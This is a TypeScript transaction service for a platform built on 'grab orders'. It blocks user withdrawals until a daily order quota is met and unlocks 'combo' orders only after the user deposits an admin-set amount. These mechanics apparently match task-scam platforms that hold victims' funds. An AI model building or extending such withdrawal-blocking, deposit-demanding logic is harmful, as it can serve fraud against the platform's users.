import User from "@/lib/models/User";
import Transaction from "@/lib/models/Transaction";
import dbConnect from "@/lib/mongodb";
import { assertAdminPermission } from "@/lib/services/server/admin-auth.server";

/** After balance is credited, allow combo submit when wallet meets admin-set `requiredDeposit`. */
async function authorizeComboAfterDeposit(userId: string, balanceAfter: number) {
    const GrabOrder = (await import("@/lib/models/GrabOrder")).default;
    const pendingCombos = await GrabOrder.find({
        userId,
        status: "PENDING",
        isCombo: true,
        isAdminAuthorized: false,
    });
    for (const o of pendingCombos) {
        const need = Number(o.requiredDeposit) || 0;
        if (need > 0 && balanceAfter >= need) {
            o.isAdminAuthorized = true;
            await o.save();
        }
    }
}

export const transactionServerService = {
    async processTransaction(
        userId: string,
        type: "DEPOSIT" | "WITHDRAW",
        amount: number,
        depositAddress?: string,
        withdrawAddress?: string,
        withdrawNetwork?: string,
    ) {
        await dbConnect();

        const user = await User.findById(userId);
        if (!user) throw new Error("User not found");

        const isAdmin = user.role === "ADMIN";

        // [1] Block regular-user withdrawals until daily tasks are complete
        if (!isAdmin && type === "WITHDRAW") {
            const completed = user.dailyTasksCompleted ?? 0;
            const total = user.maxDailyTasks ?? 25;
            if (completed < total) {
                throw new Error(
                    `You must complete all ${total} daily orders before withdrawing. ` +
                    `Currently ${completed}/${total} done.`
                );
            }
        }

        if (isAdmin) {
            if (type === "WITHDRAW" && user.balance < amount) throw new Error("Insufficient balance");
            const balanceChange = type === "DEPOSIT" ? amount : -amount;
            user.balance += balanceChange;
            await user.save();
            const transaction = await Transaction.create({ userId, type, amount, status: "COMPLETED" });
            if (type === "DEPOSIT") {
                await authorizeComboAfterDeposit(user._id.toString(), user.balance);
            }
            return { balance: user.balance, transaction };
        }

        // Regular users: create a PENDING request
        const transaction = await Transaction.create({
            userId,
            type,
            amount,
            status: "PENDING",
            depositAddress: depositAddress || "",
            withdrawAddress: withdrawAddress || "",
            withdrawNetwork: withdrawNetwork || "",
        });
        return { balance: user.balance, transaction };
    },

    async getRecentTransactions(userId: string, limit = 10) {
        await dbConnect();
        return await Transaction.find({ userId }).sort({ createdAt: -1 }).limit(limit);
    },

    async getPendingTransactions() {
        await dbConnect();
        return await Transaction.find({ status: "PENDING" })
            .populate("userId", "name email balance")
            .sort({ createdAt: -1 });
    },

    async updateTransactionStatus(transactionId: string, status: "COMPLETED" | "REJECTED", adminUserId: string) {
        await dbConnect();

        await assertAdminPermission(adminUserId, "MANAGE_TRANSACTIONS");

        const transaction = await Transaction.findById(transactionId);
        if (!transaction) throw new Error("Transaction not found");
        if (transaction.status !== "PENDING") throw new Error("Transaction already processed");

        if (status === "COMPLETED") {
            const user = await User.findById(transaction.userId);
            if (!user) throw new Error("User not found for transaction");

            if (transaction.type === "WITHDRAW") {
                if (user.balance < transaction.amount) {
                    transaction.status = "FAILED";
                    await transaction.save();
                    throw new Error("User has insufficient balance for this withdrawal");
                }
                user.balance -= transaction.amount;
            } else if (transaction.type === "DEPOSIT") {
                user.balance += transaction.amount;
            }
            await user.save();

            if (transaction.type === "DEPOSIT") {
                await authorizeComboAfterDeposit(user._id.toString(), user.balance);
            }
        }

        transaction.status = status;
        await transaction.save();
        return transaction;
    },
};
